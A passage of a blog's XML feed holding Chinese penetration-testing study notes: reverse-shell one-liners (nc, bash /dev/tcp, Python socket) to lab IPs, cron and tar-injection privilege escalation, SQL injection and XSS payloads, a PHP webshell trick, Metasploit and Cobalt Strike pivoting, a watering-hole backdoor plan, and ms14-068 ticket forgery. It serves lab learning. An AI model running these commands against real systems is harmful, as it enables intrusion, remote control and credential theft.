alt="image.png"></p><p>工厂模式<br>​</p>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell合集</title>
      <link href="/2024/03/14/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/"/>
      <url>/2024/03/14/%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>反弹shell生成器<br>通过浏览器访问<a href="http://ip/q.php?name=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E5%89%8D%E6%8F%90%E6%98%AF%E7%9F%A5%E9%81%93%E4%BA%86name%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8wfuzz%EF%BC%8Cfuff%E5%B7%A5%E5%85%B7%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0%E3%80%82">http://ip/q.php?name=命令执行脚本前提是知道了name这个请求参数，可以使用wfuzz，fuff工具爆破得到。</a><br>命令执行脚本主要是一些系统命令：whoami，id等等   一般可以是whoami;id 或者id等<br>同样还可能存在xss注入<br>如果能够执行，可以注入反弹shell命令 nc 172.20.10.2 6666 -e &#x2F;bin&#x2F;sh</p><p>利用系统执行脚本(脚本有可写权限)如果进入当前shell中发现系统执行脚本(该脚本每段时间就会执行一次),并且脚本执行的角色是比当前角色等级高的角色如root     一般路径是&#x2F;etc&#x2F;corntab<br>既然可写，就可以想脚本中写入反弹shell脚本<br>&#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.20.10.3&#x2F;8888 0&gt;&amp;1</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全知识杂项3</title>
      <link href="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B93/"/>
      <url>/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B93/</url>
      
        <content type="html"><![CDATA[<p>sudo 提权涉及到的命令<br>kali字典位置<br>wpscan 爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:// --passwords /usr/share/wordlists/rockyou.txt --usernames admin</span><br></pre></td></tr></table></figure><p>sh 反弹shellecho”nohup nc -e &#x2F;bin&#x2F;sh 192.168.1.7 4444&amp;” &gt; custom_check_mem<br>lua 提权<br>python逃逸沙箱机制<br>&#x2F;smbclient  连接smb服务<br>wpscan 工具使用wpscan –disable-tls-checks –url <a href="http://www.midwest.htb/">http://www.midwest.htb/</a>  -U admin -P &#x2F;home&#x2F;enyo&#x2F;wordlist.txt<br>爆破</p><p>joomscan使用<br>ssrf 漏洞利用工具<br>存活主机扫描<br>zip 密码爆破frackzip</p><p>sudo -l提权   与    root用户可执行文件提权在sudo -l 成功提权但是并不能拥有实际root权限时<br><img src="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B93/1693927525612-2bb08c84-454f-49a0-bff8-032f6a51192f.png" alt="image.png"></p><p><img src="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B93/1693976199749-926cf3af-ef11-427c-95b9-37655b8eeeaf.png" alt="image.png"></p><p>输出终端<br>import  pty<br>pry.spawn(“&#x2F;bin&#x2F;bash”)</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF内网渗透</title>
      <link href="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>靶场搭建<br><strong>专业术语</strong><br>*<em>– Exploit，攻击工具&#x2F;代码 **<br><strong>– Payload</strong></em>*，攻击载荷 **<br>**– Shellcode shell ***<em>代码 **<br><strong>– Module</strong></em>*，模块 **<br><strong>– Listener，监听器</strong><br><strong>​</strong><br><strong>Metasploit主目录</strong><br><strong>​</strong><br><strong>DB_MAP扫描服务</strong><br><strong>Kali Linux &#x2F;usr&#x2F;share&#x2F;metasploit-framework</strong><br><strong>开启sql数据库 5432端口</strong><br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689767670329-41c88c97-dfa5-47d3-9219-09adb4214065.png" alt="image.png"></p><p>初始化msf数据库<br>**sudo msfdb init **<br><strong>​</strong><br><strong>连接数据库</strong><br><strong>db_connect  -y   相应的.yml文件</strong><br><strong>如</strong><br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689768186641-39567a2f-62ff-4fb0-9a4c-d44ee496f906.png" alt="image.png"></p><p>查看数据库状态<br>db_status<br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689768476055-34590719-2202-40d1-9bd9-81ccb34e92f4.png" alt="image.png"></p><p>使用db_nmap 进行服务扫描<br>db_namp  10.10.10.135 -sV A<br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689768756183-159d3f42-b670-49f1-afbb-9a49d0ae4d95.png" alt="image.png"></p><p>查看服务services<br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689768898552-da65fbe0-9077-4faf-9545-30a1b9222d1a.png" alt="image.png"></p><p>services 操作<br>services -h<br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689768979001-e3765e1a-372f-4095-a94a-cedf900630b5.png" alt="image.png"></p><p>hosts<br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689769189666-a8eb74db-337a-4c55-a4a8-129a18a09ab0.png" alt="image.png"></p><p>kali中猕猴桃迁移到kiwi中<br><img src="/2024/03/14/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1689774168131-280a6ab6-0734-43e5-8ad7-46794d0ab525.png" alt="image.png"></p><p>在msf中shell命令之后出现乱码<br>chcp 65001</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全杂项知识2</title>
      <link href="/2024/03/14/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%862/"/>
      <url>/2024/03/14/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%862/</url>
      
        <content type="html"><![CDATA[<p>字典生成工具crunch<br>samba服务扫描 enum4linux 192.168.5.180  </p><p>ffuf使用<br>nmap常见端口21,22,80,139,445,3306,11111,22222,33333,44444,55555,33334,44441<br>linux中执行.sh程序在linux中如果是.sh脚本可以修改内容为反弹shell进行执行，获得shell<br>suid提权bash -p<br>tar 命令注入echo “&#x2F;bin&#x2F;bash” &gt; exp.sh<br>echo “” &gt; “–checkpoint-action&#x3D;exec&#x3D;sh exp.sh”<br>echo “” &gt; –checkpoint&#x3D;1</p><p>nc反弹python3 -c ‘import socket,subprocess,os;<br>s &#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect(( “192.168.59.4” , 6666 ));<br>os.dup2(s.fileno(), 0 );<br>os.dup2(s.fileno(), 1 );<br>os.dup2(s.fileno(), 2 );<br>p &#x3D; subprocess.call([ “&#x2F;bin&#x2F;bash” , “-i” ]);’<br>linux监控正在运行的进程工具：pspy   64bit<br>.&#x2F;pspy64</p><p>dns<br>端口碰撞端口碰撞</p><p>端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过特定端口进行连接。<br>​<br>也就是说，攻击者可能通过端口扫面来利用一些端口服务来发动攻击，但是一些固定的端口又需要开放来满足远程维护需求，因此，我们可以使用端口碰撞技术来形成一个访问控制。<br>​<br>我们需要去碰撞一个特定的端口序列，才能够打开我们想要访问的端口。<br>​<br>10000<br>4444<br>65535<br>​<br>knock命令：<br>knock <IP> <PORT1> <PORT2> <PORT3> <PORT4> -v<br>提取图片信息</PORT4></PORT3></PORT2></PORT1></IP></p><p>图片一句话shellcopy 1.gif&#x2F;b+moon.php shell.php</p><p>nmap配合内置脚本 sudo nmap –script-updatedb -v -sV -A 192.168.59.25  –script&#x3D;vuln</p><p>命令执行(反弹shell，一句话木马等都失败时)一种新的尝试：<br><strong>use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery   #使用这个攻击模块</strong><br><strong>set payload php&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</strong><br><strong>set target php    #设置目标</strong><br><strong>show options    #查看选项</strong><br>** 网站是php编写的**<br>linux查询本地端口ss -tlnu<br>base 解密<br>文件包含shell<a href="http://192.168.59.19/secret//evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&txt=NDU2">http://192.168.59.19/secret//evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=NDU2</a><br>这个url就是想当前目录创建test.php，内容为NDU2<br>标签钓鱼漏洞</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的web漏洞</title>
      <link href="/2024/03/14/%E5%B8%B8%E8%A7%81%E7%9A%84web%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/14/%E5%B8%B8%E8%A7%81%E7%9A%84web%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>sql注入一般流程：<br>1.判断注入类型post，get，cookie<br>注入手段方式都差不多，只是注入点不同<br>2.进一步判断注入类型字符型，数字型<br>可以使用逻辑语法：<br>数字型：1 &#x3D; 1 ,1&#x3D;2<br>字符型：’1’ &#x3D; ‘1’ ,’1’&#x3D;’2’<br>3.确定注入类型之后，可以使用order by命令来判断字段数<br>如：order by 5 直到出现unknown 错误信息<br>4.进一步获取数据库的系统信息如user(),database(),version()等<br>如：union select user(),database()<br>5.查询数据库中的表名<br>如：group_concat(table_name) from information_schema.tables wherer table_schema &#x3D; database();<br><strong>注意：在是用group_concat()查询时注意from位置，1’ union select 1,2,3,group_concat(table_name),5,6,7 from information_schema.tables where table_schema&#x3D;’mutillidae’ #</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(table_name),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;mutillidae&#x27;</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure><p>6.查询列名<br>如:group_concat(column_name) from information_schema.columns where table_name&#x3D;users;<br>7.查询用户数据<br>如：select group_concat(user_id,first_name,last_name),group_concat(password) from<br>users<br>文件包含程序在引用文件的时，引用的文件名，用户可控的情况，传入的文件名没有经过合理的校验或校验不 严，从而操作了预想之外的文件，就有可能导致文件泄漏和恶意的代码注入。<br>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无 需再次编写，这重文件调用的过程一般被称为文件包含。<br>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这 种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在 PHP Web Application 中居多,<br>而在 JSP、ASP、ASP.NET 程序中却非常少，甚至没有，这是有些语言设计的弊端。在 PHP 中经常出现包含 漏洞，但这并不意味这其他语言不存在。<br>​<br><strong>常见文件包含函数：</strong><br>include()  执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br>require()  只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br>include_once()和 require_once()：若文件中代码已被包含则不会再次包含。<br><strong>远程文件包含：</strong><br>将远程文件包含到本地，一般使用url等协议。<br>** allow_url_fopen” 和”allow_url_include” 必须为on**<br><strong>​</strong><br>​<br><strong>如果不对引用的文件名做过滤，就可能使用..&#x2F;..&#x2F;等访问到系统的敏感文件(在权限足够的情况下)</strong><br>csf跨站点框架（Cross-Site Framing）是一种允许一个网站在自己的页面中嵌入来自另一个网站的内容的技术。这个技术通常用于显示其他网站的内容，例如社交媒体插件、广告或嵌入式地图等。<br>然而，跨站点框架也存在安全风险。攻击者可以利用跨站点框架来创建诈骗页面，将恶意代码注入到受害者浏览器中，或者欺骗用户执行某些危险操作。这种攻击方式被称为点击劫持（Clickjacking）。<br>为了防止跨站点框架攻击，网站可以采取以下措施：</p><ol><li>使用X-Frame-Options标头或Content Security Policy（CSP）来限制页面的嵌入方式。这些安全标头可以告知浏览器是否允许页面在iframe中显示，并可以设置允许显示的来源。</li><li>实施点击劫持检测和防御机制。这可以包括使用JavaScript脚本检测页面是否被嵌入到其他网站中，或者使用特殊CSS样式来保护页面内容。</li><li>对用户进行教育和警示，提醒他们注意不要在不信任的网站上执行危险操作，并且定期更新浏览器和操作系统以获取最新的安全修复。通过采取这些预防措施，网站可以增强其安全性，减少跨站点框架攻击的风险。<br>HTTP Response Splitting<br>目录扫描目录扫描能够让我们看清整体网站的结构，通过访问不同的目录能够对网站进一步获取敏感的文件以及数据，系统信息等<br>xss在遇到网站将&lt;&gt;标签过滤时。可以尝试多次输入&lt;&gt;标签如<br><strong><a href="javascript:alert(1);">fff</a><a href="javascript:alert(1);">fff</a><a href="javascript:alert(1);">fff</a><a href="javascript:alert(1);">fff</a></strong><br><strong>​</strong><br>但是有在 input 这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签。 <input type="text" name="username" value onclick="javascript:alert('xss');">命令执行 ； &  |xxe实体漏洞</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs工具基础使用</title>
      <link href="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>准备cs包<br>在kali中打开包，查看是否有运行权限即<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1689934195885-f2db9f02-c8a2-4c40-8e29-0dbb6f226027.png" alt="image.png"></p><p>可以使用<strong>sudo chmod  +x  teamserver</strong> 给予运行权限<br>​<br>启动teamserver<br><strong>.&#x2F;teamserver 192.168.183.147 123456  ip+密码</strong><br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1689934742054-9ab69a54-7242-48d6-937c-848c08cf1c0c.png" alt="image.png"></p><p>在Windows中连接<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1689934906863-d06117f9-c609-48cd-8fb7-38889dd01284.png" alt="image.png"></p><p>连接成功<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1689934945329-9007b7e1-53f7-4f19-ab7b-07433d2ee02c.png" alt="image.png"></p><p>在linux中连接<br><strong>sudo .&#x2F;cobalt strike</strong> (cobalt strike 应当有执行权)<br>​<br>但是上面命令 一旦窗口关闭了 teamserver就会自动关掉 可以使用nohup 命令设置后台运行<br><strong>sudo nohup .&#x2F;teamserver 192.168.0.190 123456</strong><br>​<br>查看teamserver情况<br><strong>ps aux|grep teamserver</strong><br><strong>netstat -antlp</strong><br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1689935678093-ff64d935-6123-4791-a803-baf874287266.png" alt="image.png"></p><p><strong>代理转发</strong><br>主机A 192.168.248.131<br>主机B 192.168.248.145  10.10.10.139<br>主机C 10.10.10.138<br>​<br>在没设置路由表的情况下，主机A是无法直接访问主机C的，但是可以访问主机B，而主机B可以访问主机C，所以可以通过主机B转发进而与主机C通信<br>​<br>通过后门文件获取主机B的权限<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690010886374-4f3966f5-adab-48fe-baaf-b5fc00712137.png" alt="image.png"></p><p>设置代理，这里设置端口为1080<br>在teamserver主机中修改配置文件<br>**sudo  vim &#x2F;etc&#x2F;proxychains4.conf **<br><strong>socket4  192.168.248.131  1080</strong><br>​<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690011184399-3326374f-e1b3-4265-a26e-ad8ede7b9bf7.png" alt="image.png"></p><p>使用proxychains4 nmap 10.10.10.138 -sT -A -p 445<br>让代理走这条隧道(192.168.248.131:1080 -&gt;10.10.10.138:445)<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690011453938-23846cef-41f4-40a7-8ac7-198f0c0189a5.png" alt="image.png"></p><p><strong>转发上线</strong><br>主机A 192.168.248.131<br><strong>主机B 192.168.248.145  10.10.10.139</strong><br><strong>主机C 10.10.10.138</strong><br><strong>​</strong><br><strong>通过监听主机B，在主机C中设置后门，一旦主机B监听到了主机C，主机便能进一步渗透到主机C</strong><br><strong>这里监听的IP地址为主机B，即内网IP</strong><br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690012146256-54b8c607-3279-4107-afa2-6dd8dd922ba3.png" alt="image.png"></p><p>将生成的后门文件在主机C中执行，主机B便会监听到主机C，而主机A又在监听主机B所以主机A也能控制到主机C<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690012413370-c0fd69ba-13df-4a52-ac17-52bc7c9ce112.png" alt="image.png"></p><p><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690013974980-070eb598-7c9d-47d9-9b26-e2f31c139139.png" alt="image.png"></p><p><strong>vpn搭建</strong><br>在主机B中新建一个虚拟网卡接口<br>​<br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690014124457-d1311d30-20fa-4af3-89aa-eee27da4a284.png" alt="image.png"></p><p><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690014355139-bf12eeba-6ab6-4a5d-8284-7f78fb6cde2a.png" alt="image.png"></p><p><strong>kali中 分配ip地址 sudo ifconfig phear0 10.10.10.0&#x2F;24</strong><br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690014331894-adc6c494-caf4-4fb2-9ad5-2af175838fa4.png" alt="image.png"></p><p><strong>水抗攻击 免杀后门 加flash钓鱼制作</strong><br><img src="/2024/03/14/cs%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/1690023947977-c24e60ae-a0fa-404f-90a8-0fa508c3f208.pdf" alt="水抗攻击 免杀后门 加钓鱼制作.pdf"></p><p>水抗攻击<br>“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做<br>法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并<br>植入攻击代码，一旦攻击目标访问该网站就会“中招”。<br>**在渗透测试中，通常用于后台没法拿webshell，在网站找xss漏洞植入后门，当管理员访问时，弹出框 **<br><strong>诱导管理员下载后门文件</strong></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与服务器部署</title>
      <link href="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/"/>
      <url>/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>docker命令大全</p><p>docker容器的读物服务处于内网中，所以不能直接访问</p><p><strong>通过轻量级服务器将内部docker服部署到公网ip上</strong>一.网络拓扑<br><img src="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/1691242429846-3f1256c1-3797-4f35-8980-f5c9947c5823.png" alt="image.png"></p><p>虽然主机A与Ubuntu处于同一个内网中，也可以直接访问Ubuntu的ip来访问网站<br>这么做的前提是在Ubuntu中开启了docker服务，相关命令在上面docker中有详细介绍<br>但是我的想法是将docker中的服务部署到公网中，使用公网ip访问网站，这么做是为了从外网打点进一步访问到ubuntu中其他内网主机，即横向渗透，进一步找到域控主机拿下域控主机。<br>但是这部分内容不会在这里介绍，这里只介绍如何将其部署到公网ip<br>二.购买服务器<br>作为测试，我购买了一个小型的轻量级服务器（Windows 12r）ip我这里就随机编一个了，你懂得如上图。<br>具体可以去腾讯云，阿里云等等，也可以买国外的<br>​<br>三.frp下载<br>我们需要下载frp来讲docker服务映射到公网服务器中<br>地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>下载之后，在对应的服务器中解压相应的版本，我这里是windows<br><img src="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/1691243139228-c4f56efb-98cb-4d00-b484-7c814011addd.png" alt="image.png"></p><p>在frps(服务端)中设置绑定端口 可以设定token对应密码<br>​<br>然后在客户端设置frpc(客户端)<br>我的客户端是Ubuntu的所以解压linux版本的fpr<br><img src="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/1691244050828-485683ba-bd30-4ea8-a16e-1e5cb2cd2da7.png" alt="image.png"></p><p>同样在fprc.ini中设置远程ip端口以及本地的端口服务以及远程端口<br>流程就是访问远程的80端口就会映射到本地的80端口服务中<br>​<br>分别在Windows与Ubuntu中开启服务<br>win：frps.exe  -c  frps.ini<br>ubuntu: .&#x2F;frpc  -c frpc.ini<br>​<br>成功<br><strong>注意：由于在Windows中的frps.ini中我设置的端口为7000，所以还需要在公网服务器中将7000打开并允许访问</strong><br><img src="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/1691244331790-0fd5e0d7-3d22-4957-bac6-f19aeccfba82.png" alt="image.png"></p><p><img src="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/1691244216363-fb2d7552-093c-4312-b278-ced7c5265600.png" alt="image.png"></p><p>四.访问网站<br>在主机A中访问公网的80端口即可访问到Ubuntu中的网站<br><img src="/2024/03/14/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/1691244430312-e9b591a3-924f-4f47-aa6c-7650ad477837.png" alt="image.png"></p><p>这样就将内网中服务部署到公网上了<br>​</p>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域安装-2008server</title>
      <link href="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/"/>
      <url>/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/</url>
      
        <content type="html"><![CDATA[<p>以Windows2008R演示<br><strong>一.添加服务器角色，选择域服务</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689411915384-7c094e46-7734-4196-a605-80353fcbf147.png" alt="image.png"></p><p><strong>运行域服务安装向导</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689412145146-66496396-1417-4ea6-ac7a-3a46a3ee710f.png" alt="image.png"></p><p><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689412167751-2d0e6e59-59aa-4b26-a293-2422716b896d.png" alt="image.png"></p><p><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689412187488-fb805885-b0b7-460d-b4ac-833212bb154d.png" alt="image.png"></p><p><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689412224964-af0128c9-9013-4352-968b-8763a5431fe1.png" alt="image.png"></p><p><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689412286444-b75c15e0-705c-463f-ae7c-33ea1390f16e.png" alt="image.png"></p><p><strong>数据库文件，日志文件，sysol文件</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689412340169-8a4ebeec-80c4-4363-96ef-64c7dd168a15.png" alt="image.png"></p><p><strong>二.打开ad活动目录管理中心</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689413833747-069ce383-39f1-434f-bdae-2ade11386dab.png" alt="image.png"></p><p>密码设置策略<br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689414054088-2db92bbd-659f-46f3-96ec-88e18f037f93.png" alt="image.png"><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689414082811-79f31cfc-7bf8-40ed-b865-413ac2dd1bd4.png" alt="image.png"><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689414112612-a6c5c74e-98ee-4e60-ae46-1419e4c49b98.png" alt="image.png"><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689414188470-150ae4b7-f25b-4c4f-b556-031bd8c2b036.png" alt="image.png"></p><p><strong>新建用户，密码永不过期，不能修改密码</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689414407711-252f983e-9bfd-4fa9-be84-6cbf3ffd33d4.png" alt="image.png"></p><p><strong>三.将win10加入moosec.fbi中</strong><br><strong>设置DNS，将o8server-dc中的IP设置为服务器</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689414651425-27be52b1-c41c-4060-bca0-1ab4751cf6e1.png" alt="image.png"></p><p><strong>更改该计算机所属的组为域</strong><br><strong>用户名即为在moonsec.fbi中新添加的用户</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689415062142-da85b75b-d3aa-4f20-81f8-7b9d65b36835.png" alt="image.png"></p><p>加入成功<br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689415109688-5a2ea226-2df2-4962-bb54-8bb61467e7a3.png" alt="image.png"></p><p>重启之后<br>登录到域  moonsec\test   123456<br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689415310508-a0dac41e-d3d0-480e-981c-41bfbe34dabb.png" alt="image.png"></p><p>可以看到已经是一个域用户，并不是超级管理员<br>​<br>​<br>​<br>​<br>​<br>​<br><strong>域普通用户提权</strong><br><strong>只是普通域用户</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689572618732-8b78b7fc-0a45-434e-a4dc-d7dbf9af0ead.png" alt="image.png"></p><p><strong>一.使用whoami  &#x2F;all 查看sid</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689575247991-c23855e5-b857-45fd-9d67-02482cac22f3.png" alt="image.png"></p><p><strong>二.使用</strong>ms14-068.exe<strong>漏洞获取类似黄金票据</strong><br>ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址<br>ex：<br><strong>ms14-068.exe -u <a href="mailto:&#x74;&#x65;&#x73;&#x74;&#48;&#x31;&#64;&#x6d;&#111;&#x6f;&#110;&#115;&#101;&#x63;&#x2e;&#102;&#98;&#x69;">&#x74;&#x65;&#x73;&#x74;&#48;&#x31;&#64;&#x6d;&#111;&#x6f;&#110;&#115;&#101;&#x63;&#x2e;&#102;&#98;&#x69;</a> -p 1234567 -s S-1-5-21-1150192022-1799323776-2937365978-1112 -d 08server-dc.moonsec.fbi</strong><br><img 